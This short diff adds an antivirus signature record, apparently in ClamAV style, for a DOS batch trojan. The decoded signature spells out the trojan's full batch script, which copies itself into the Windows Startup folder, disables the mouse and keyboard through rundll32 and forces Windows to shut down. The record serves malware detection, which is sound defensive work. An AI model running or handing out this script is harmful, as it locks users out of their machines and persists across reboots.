@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36614
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ctty nul xcopy *.bat c:\windows\startm~1\progra~1\autost~1 copy *.bat c:\windows\startm~1\progra~1\autost~1 c:\windows\rundll32.exe mouse,disable c:\windows\rundll32.exe keyboard,disable cd.. cd.. c:\windows\rundll32.exe user,exitwindowsexec cls end exit 
